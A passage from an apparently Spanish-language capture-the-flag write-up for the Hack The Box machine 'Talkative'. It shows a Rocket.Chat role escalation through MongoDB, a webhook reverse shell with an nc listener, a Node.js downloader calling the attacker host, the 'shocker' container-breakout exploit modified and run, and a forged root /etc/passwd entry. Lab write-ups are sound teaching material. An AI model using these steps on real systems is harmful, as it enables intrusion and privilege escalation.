</code></pre></div><p>Pero si intentamos iniciar sesión en Rocket.Chat, dice que las credenciales son incorrectas&mldr; Bueno, aún podemos registrar una nueva cuenta:</p><p><img src="/images/HTB/Talkative/Talkative-14.png" alt="Talkative 14"></p><p><img src="/images/HTB/Talkative/Talkative-15.png" alt="Talkative 15"></p><p><img src="/images/HTB/Talkative/Talkative-16.png" alt="Talkative 16"></p><h3 id="accediendo-a-rocketchat-como-administrador">Accediendo a Rocket.Chat como administrador</h3><p>Ahora tenemos este nuevo usuario en la base de datos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>rs0 [direct: primary] meteor&gt; db.users.find({ <span class="code-dark-yellow">name</span>: <span class="code-dark-green">'asdf'</span> }).pretty();
[
  {
    _id: <span class="code-dark-green">'Fs9i99sjZPM767PeP'</span>,
    createdAt: ISODate("2023-02-09T00:57:21.808Z"),
    services: {
      password: {
        bcrypt: <span class="code-dark-green">'$2b$10$saX2GRiRUp00yKbj9Kao4eCh3SRG1w6aCGQzXla4UcTah0GkofD6K'</span>,  
        reset: {
          token: <span class="code-dark-green">'pIexTA3cnqeSWhBJZcCbglXtZpIV48nh0DviXWysiz4'</span>,
          email: <span class="code-dark-green">'asdf@talkative.htb'</span>,
          when: ISODate("2023-02-09T00:57:28.600Z"),
          reason: <span class="code-dark-green">'enroll'</span>
        }
      },
      email: {
        verificationTokens: [
          {
            token: <span class="code-dark-green">'rKgGJ9bE8KyrXwnw1B9nQK8iHrw1NCYYEdGYdtHfoP8'</span>,
            address: <span class="code-dark-green">'asdf@talkative.htb'</span>,
            when: ISODate("2023-02-09T00:57:21.861Z")
          }
        ]
      },
      resume: {
        loginTokens: [
          {
            when: ISODate("2023-02-09T00:57:22.080Z"),
            hashedToken: <span class="code-dark-green">'4OkcrRSc4miDuaYPu6r4aKySrY6/+R7gyqO1mQ5VZ9k='</span>
          }
        ]
      }
    },
    emails: [ { address: <span class="code-dark-green">'asdf@talkative.htb'</span>, verified: <span class="code-dark-yellow">false</span> } ],
    type: <span class="code-dark-green">'user'</span>,
    status: <span class="code-dark-green">'online'</span>,
    active: <span class="code-dark-yellow">true</span>,
    _updatedAt: ISODate("2023-02-09T01:01:32.661Z"),
    roles: [ <span class="code-dark-green">'user'</span> ],
    name: <span class="code-dark-green">'asdf'</span>,
    lastLogin: ISODate("2023-02-09T01:01:32.616Z"),
    statusConnection: <span class="code-dark-green">'online'</span>,
    utcOffset: <span class="code-dark-yellow">1</span>,
    username: <span class="code-dark-green">'asdf'</span>
  }
]
</code></pre></div><p>Actualicemos su rol a <code>admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>rs0 [direct: primary] meteor&gt; db.users.updateOne({ <span class="code-dark-yellow">name</span>: <span class="code-dark-green">'asdf'</span> }, { <span class="code-dark-yellow">$set</span>: { <span class="code-dark-yellow">roles</span>: [ <span class="code-dark-green">'admin'</span> ] } });  
{
  acknowledged: <span class="code-dark-yellow">true</span>,
  insertedId: <span class="code-white">null</span>,
  matchedCount: <span class="code-dark-yellow">1</span>,
  modifiedCount: <span class="code-dark-yellow">1</span>,
  upsertedCount: <span class="code-dark-yellow">0</span>
}
</code></pre></div><p>Ahora, actualizamos la aplicación y veremos un panel de administración:</p><p><img src="/images/HTB/Talkative/Talkative-17.png" alt="Talkative 17"></p><p>Mirando todas las opciones, la de &ldquo;<em>Integrations</em>&rdquo; se ve interesante:</p><p><img src="/images/HTB/Talkative/Talkative-18.png" alt="Talkative 18"></p><p>Aquí podemos crear <em>webhooks</em> entrantes/salientes:</p><p><img src="/images/HTB/Talkative/Talkative-19.png" alt="Talkative 19"></p><p>Por ejemplo, creemos un <em>webhook</em> entrante:</p><p><img src="/images/HTB/Talkative/Talkative-20.png" alt="Talkative 20"></p><p>Ambas integraciones tienen la opción de ingresar un script node.js que se ejecutará cuando se active Wenhook. Echando un ojo a la <a href="https://docs.rocket.chat/use-rocket.chat/rocket.chat-workspace-administration/integrations">documentación</a> y buscando maneras de ejecutar comandos desde Rocket.Chat, encontramos este <a href="https://gist.github.com/pich4ya/4ead1cac303579934ea006035dd0ca4e">Gist de GitHub</a>. Por lo tanto, obtengamos otra <em>reverse shell</em>:</p><p><img src="/images/HTB/Talkative/Talkative-21.png" alt="Talkative 21"></p><p>Para activar el <em>webhook</em> (y la <em>reverse shell</em>), podemos usar <code>curl</code>:</p><p><img src="/images/HTB/Talkative/Talkative-22.png" alt="Talkative 22"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -X POST -H <span class="code-dark-yellow">'Content-Type: application/json'</span> --data <span class="code-dark-yellow">'{"text":"pwn","attachments":[{}]}'</span> http://10.10.11.155:3000/hooks/cZKmjXbDpC6G4Gu5h/XqvXNct3Sg6KfrHMdjZACr3FF7uLpD59qdtmoZ4qmjPZ2zCt  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.155.
Ncat: Connection from 10.10.11.155:55706.
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell
root@c150397ccd63:/app/bundle/programs/server# cd
cd
root@c150397ccd63:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@c150397ccd63:~# ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
root@c150397ccd63:~# export TERM=xterm
root@c150397ccd63:~# export SHELL=bash
root@c150397ccd63:~# stty rows 50 columns 158
</code></pre></div><p>Y llegamos a otro contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# hostname -i
172.17.0.3
root@c150397ccd63:~# ls -la /
total 76
drwxr-xr-x   1 root       root       4096 Aug 10  2021 .
drwxr-xr-x   1 root       root       4096 Aug 10  2021 ..
-rwxr-xr-x   1 root       root          0 Aug 10  2021 .dockerenv  
drwxr-xr-x   1 rocketchat rocketchat 4096 Aug  2  2021 app
drwxr-xr-x   2 root       root       4096 Jul 21  2021 bin
drwxr-xr-x   2 root       root       4096 Jun 13  2021 boot
drwxr-xr-x   5 root       root        340 Feb  8 21:05 dev
drwxr-xr-x   1 root       root       4096 Aug 10  2021 etc
drwxr-xr-x   2 root       root       4096 Jun 13  2021 home
drwxr-xr-x   1 root       root       4096 Aug  2  2021 lib
drwxr-xr-x   2 root       root       4096 Jul 21  2021 lib64
drwxr-xr-x   2 root       root       4096 Jul 21  2021 media
drwxr-xr-x   2 root       root       4096 Jul 21  2021 mnt
drwxr-xr-x   2 root       root       4096 Jul 21  2021 opt
dr-xr-xr-x 420 root       root          0 Feb  8 21:05 proc
drwx------   1 root       root       4096 Aug  2  2021 root
drwxr-xr-x   3 root       root       4096 Jul 21  2021 run
drwxr-xr-x   2 root       root       4096 Jul 21  2021 sbin
drwxr-xr-x   2 root       root       4096 Jul 21  2021 srv
dr-xr-xr-x  13 root       root          0 Feb  8 21:05 sys
drwxrwxrwt   1 root       root       4096 Feb  9 02:03 tmp
drwxr-xr-x   1 root       root       4096 Jul 21  2021 usr
drwxr-xr-x   1 root       root       4096 Jul 21  2021 var
</code></pre></div><h3 id="explotación-de-_capabilities_">Explotación de <em>capabilities</em></h3><p>El problema aquí es que no tenemos comandos útiles para transferir archivos entre el contenedor y nuestra máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# which nc
root@c150397ccd63:~# which curl  
root@c150397ccd63:~# which wget
</code></pre></div><p>Aun así, podríamos usar <code>bash</code>, pero me siento más cómodo con Node.js:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# which node  
/usr/local/bin/node
</code></pre></div><p>Usaré el siguiente <em>script</em> para descargar archivos dentro del contenedor usando una petición HTTP:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env node</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">http</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'http'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">req</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">http</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://10.10.17.44:8000</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">chunks</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> []</span>

<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">on</span><span class="mtk1">(</span><span class="mtk4">'data'</span><span class="mtk1">, </span><span class="mtk9 mtki">chunk</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">chunks</span><span class="mtk1">.</span><span class="mtk8">push</span><span class="mtk1">(</span><span class="mtk9 mtki">chunk</span><span class="mtk1">))</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">on</span><span class="mtk1">(</span><span class="mtk4">'end'</span><span class="mtk1">, () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk8 mtku">Buffer</span><span class="mtk1">.</span><span class="mtk8">concat</span><span class="mtk1">(</span><span class="mtk1">chunks</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">()))</span>  
<span class="mtk1">});</span>

<span class="mtk1">req</span><span class="mtk1">.</span><span class="mtk8">on</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">, </span><span class="mtk9 mtki">e</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">'ERROR: '</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk9 mtki">e</span><span class="mtk1">.</span><span class="mtk1">message</span><span class="mtk1">))</span>
</code></pre></div><p>Ahora podemos subir <em>scripts</em> de enumeración como <a href="https://github.com/carlospolop/PEASS-ng"><code>linpeas.sh</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>root@c150397ccd63:~# cat &gt; get.js
#!/usr/bin/env node

const http = require('http')
const path = process.argv[2]

const req = http.get('http://10.10.17.44:8000' + path, res =&gt; {
  let chunks = []

  res.on('data', chunk =&gt; chunks.push(chunk))
  res.on('end', () =&gt; console.log(Buffer.concat(chunks).toString()))  
});

req.on('error', e =&gt; console.log('ERROR: ' + e.message))
^C
root@c150397ccd63:~# node get.js /linpeas.sh &gt; linpeas.sh
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.11.155 - - [] "GET /linpeas.sh HTTP/1.1" 200 -  
</code></pre></div><p>Al ejecutar el <em>script</em>, vemos que hay algunas <em>capabilities</em> habilitadas en el contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# bash linpeas.sh
...

<span class="code-blue">╔══════════╣ <span class="code-green">Capabilities</span></span>
<span class="code-blue">╚ </span><span class="code-bg-blue code-black">https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities</span>  
Current capabilities:
CapInh: <span class="code-green">0000000000000000</span>
CapPrm: 00000000a80425fd
CapEff: 00000000a80425fd
CapBnd: 00000000a80425fd
CapAmb: <span class="code-green">0000000000000000</span>

Shell capabilities:
CapInh: <span class="code-green">0000000000000000</span>
CapPrm: 00000000a80425fd
CapEff: 00000000a80425fd
CapBnd: 00000000a80425fd
CapAmb: <span class="code-green">0000000000000000</span>

...
</code></pre></div><p>Podemos decodificarlas con <code>capsh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">capsh</span> --decode=00000000a80425fd
0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap  
</code></pre></div><p>Hay uno que es útil para escalar privilegios: <code>CAP_DAC_READ_SEARCH</code> (más información en <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search">HackTricks</a>). Podremos leer archivos arbitrarios de la máquina <em>host</em> al explotar esta <em>capability</em>.</p><p>Tendremos que compilar un <em>exploit</em> llamado <a href="http://stealth.openwall.net/xSports/shocker.c"><code>shocker.c</code></a>. Modificaré el código un poco para que acepte argumentos de línea de comandos para nombre el archivo a leer, en lugar de tener un nombre de archivo <em>hard-coded</em> como <code>/etc/shadow</code>. Además, el <em>exploit</em> necesita un archivo montado en el contenedor desde la máquina <em>host</em>. El <em>exploit</em> usa <code>/.dockerinit</code>, que no está montado. En su lugar, podemos usar <code>/etc/hostname</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/SJ7L7M7IXKP2LYEKIS4QTXWMB2:/var/lib/docker/overlay2/l/V56NO5353KGHEUPU2G64UYICZS:/var/lib/docker/overlay2/l/57PYNL7JWAUZ2ZEF5CM7JKTH2Y:/var/lib/docker/overlay2/l/K4DCIUMHCNYT3RFVQSR7KCCWLJ:/var/lib/docker/overlay2/l/LLNI6XKILGAYVK3VSFPKZQC4NI,upperdir=/var/lib/docker/overlay2/5de14f4c9bdeaf0f8a19d03adcc2d28ccc97655bb5bc5f888490c184d2ad70dc/diff,workdir=/var/lib/docker/overlay2/5de14f4c9bdeaf0f8a19d03adcc2d28ccc97655bb5bc5f888490c184d2ad70dc/work,xino=off)  
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/mapper/ubuntu--vg-ubuntu--lv on /app/uploads type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/resolv.conf type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hosts type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
root@c150397ccd63:~# mount | grep /etc/hostname
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime)
</code></pre></div><p>Realizaré estos cambios con <code>sed</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q http://stealth.openwall.net/xSports/shocker.c

<span class="code-cyan">$</span> <span class="code-dark-green">sed</span> -i <span class="code-dark-yellow">'s/.dockerinit/etc\/hostname/g'</span> <span class="mtku">shocker.c</span>

<span class="code-cyan">$</span> <span class="code-dark-green">sed</span> -i <span class="code-dark-yellow">'s/main()/main(int argc, char** argv)/g'</span> <span class="mtku">shocker.c</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">sed</span> -i <span class="code-dark-yellow">'s/"\/etc\/shadow"/argv[1]/g'</span> <span class="mtku">shocker.c
</code></pre></div><p>Ahora, compilo el código y codifico el archivo binario en Base64 para transferirlo correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">shocker.c</span>

<span class="code-cyan">$</span> <span class="code-dark-green">base64</span> <span class="mtku">a.out</span> &gt; <span class="mtku">a.out.b64</span>

<span class="code-cyan">$</span> <span class="code-dark-green">md5sum</span> <span class="mtku">a.out</span>
75c3f2fb9399c35a1bab2a221a6bd0ed  a.out

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.11.155 - - [] "GET /a.out.b64 HTTP/1.1" 200 -  
</code></pre></div><p>Y ahora lo tenemos en el contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# node get.js /a.out.b64 | base64 -d &gt; shocker  
root@c150397ccd63:~# md5sum shocker
75c3f2fb9399c35a1bab2a221a6bd0ed  shocker
</code></pre></div><p>Podemos usar este <em>exploit</em> para obtener la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>root@c150397ccd63:~# ./shocker /root/root.txt
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

&lt;enter&gt;

[*] Resolving 'root/root.txt'
[*] Found lib32
[*] Found ..
[*] Found lost+found
[*] Found sbin
...
[*] Found root
[+] Match: root ino=18
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};  
[*] Resolving 'root.txt'
[*] Found ..
[*] Found .backup
...
[*] Found .bashrc
[*] Found root.txt
[+] Match: root.txt ino=110097
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root.txt) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
b020908bd16e6dc4937e2b5a689c3b70
</code></pre></div><p>Si quisiéramos obtener una <em>shell</em> como <code>root</code>, tendríamos que encontrar una manera de escribir en un archivo (ya que no hay una clave SSH privada). Para esto, podemos explotar otra <em>capability</em> llamada <code>CAP_DAC_OVERRIDE</code>, que no está habilitad en el contenedor, pero el <em>exploit</em> funciona. Este <em>exploit</em> se puede encontrar en <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override">HackTricks</a> (este ya tiene argumentos de línea de comando correctamente configurados).</p><p>Ahora, lo compilamos y lo transferimos al contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">shocker2.c</span>
<span class="code-white">shocker2.c:</span> In function ‘<span class="code-white">find_handle</span>’:
<span class="code-white">shocker2.c:56:13:</span> <span class="code-magenta">warning: </span>implicit declaration of function ‘<span class="code-white">open_by_handle_at</span>’ [<span class="code-magenta">-Wimplicit-function-declaration</span>]  
   56 |   if ((fd = <span class="code-magenta">open_by_handle_at</span>(bfd, (struct file_handle * ) ih, O_RDONLY)) &lt; 0)
      |             <span class="code-magenta">^~~~~~~~~~~~~~~~~</span>

<span class="code-cyan">$</span> <span class="code-dark-green">base64</span> <span class="mtku">a.out</span> &gt; <span class="mtku">a.out.b64</span>

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.11.155 - - [] "GET /a.out.b64 HTTP/1.1" 200 -
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# node get.js /a.out.b64 | base64 -d &gt; shocker2  
root@c150397ccd63:~# chmod +x shocker2
</code></pre></div><p>Para escalar privilegios, modificaremos el archivo <code>/etc/passwd</code> y le pondremos una nueva contraseña a <code>root</code> (formatp DES Unix):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> passwd asdf  
ftb88guy6zk6E
</code></pre></div><p>Primero, leeremos el archivo de la máquina (desde la sesión de SSH):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">saul@talkative:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
saul:x:1000:1000:Saul,,,:/home/saul:/bin/bash
</code></pre></div><p>Ahora creamos otro archivo cambiando la <code>x</code> por la contraseña cifrada en la primera línea:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# cat &gt; passwd
root:ftb88guy6zk6E:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
